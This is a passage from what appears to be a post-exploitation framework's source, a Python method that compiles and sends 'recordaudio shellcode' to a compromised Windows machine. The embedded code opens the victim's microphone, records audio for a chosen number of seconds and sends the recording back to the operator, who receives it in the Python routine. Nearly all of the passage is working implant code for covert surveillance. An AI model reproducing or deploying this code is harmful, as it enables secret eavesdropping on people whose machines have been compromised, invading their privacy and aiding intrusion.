        #import "local", "kernel32.dll|Sleep" as "Sleep"

        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        #import "local","senddata2self" as "senddata2self"
        #import "int", "BUFFERSIZE" as "BUFFERSIZE"


        #import "local","debug" as "debug"

        struct WAVEFORMATEX {
          short    wFormatTag;
          short    nChannels;
          int      nSamplesPerSec;
          int      nAvgBytesPerSec;
          short    nBlockAlign;
          short    wBitsPerSample;
          short    cbSize;
          char     reserved[6];
        };


        struct WAVEHDRWAVEHDR {
           char     *lpData;
           int      dwBufferLength;
           int      dwBytesRecorded;
           int      *dwUser;
           int      dwFlags;
           int      dwLoops;
           int     *lpNext;
           int     *reserved;
        };
        struct WAVEINCAPS {
          short      wMid;
          short      wPid;
          int vDriverVersion;
          char       szPname[32];
          int        dwFormats;
          short      wChannels;
          short      wReserved1;
        };

        void main() {
            struct WAVEINCAPS caps;
            struct WAVEFORMATEX formatex;
            struct WAVEHDRWAVEHDR buffer;
            int count;
            int idx;
            unsigned int ret;
            int index;
            unsigned long long wavein;

            count = waveInGetNumDevs();
            sendint(count);

            index = 0;
            formatex.cbSize = 0;
            formatex.wFormatTag = 1; // WAVE_FORMAT_PCM
            formatex.nChannels = 2;
            formatex.wBitsPerSample = 8;
            formatex.nSamplesPerSec = 44100;
            ret = formatex.wBitsPerSample / 8;
            formatex.nBlockAlign = formatex.nChannels * ret;
            formatex.nAvgBytesPerSec = formatex.nSamplesPerSec * formatex.nBlockAlign;

            ret = waveInOpen( &wavein, -1, &formatex, 0, 0,  0x0008  ); // WAVE_MAPPER=-1   WAVE_FORMAT_DIRECT= 0x0008
            memset(&buffer, 0, 48);
            ret = waveInOpen( &wavein, -1, &formatex, 0, 0,  0x0000  ); // WAVE_MAPPER=-1   CALLBACK_NULL= 0x0008

            buffer.lpData = GlobalAlloc(0x40, BUFFERSIZE);
            buffer.dwBufferLength = BUFFERSIZE;

            waveInPrepareHeader(wavein, &buffer, 48);
            waveInAddBuffer(wavein, &buffer, 48);
            waveInStart(wavein);
            ret = 0;

            while( ret != 1) {
               ret = buffer.dwFlags & 0x1;
               // sendint(buffer.dwFlags);
               Sleep(100);
            }
            waveInStop(wavein);

            waveInUnprepareHeader(wavein, &buffer, 48);
            senddata2self( buffer.lpData, BUFFERSIZE);

            GlobalFree(0, buffer.lpData);
            waveInClose(wavein);

        }"""
        vars = {}
        #         Hz      bytes  channels
        sample = 44100 *  1    * 2
        vars["BUFFERSIZE"] = sample * seconds
        self.clearfunctioncache()
        request=self.compile(code,vars)

        if progr:
            progr("Sending recordaudio shellcode", 30.0)
        self.sendrequest(request)
        count  = self.readint()

        if count == 0:
            return None

        data = self.readblock()
        progr("Datalen: %d" % len(data), 40.0)
        self.leave()

        if progr:
            progr("Complete receiving audio for %d seconds " % seconds, 100.0)

        return data
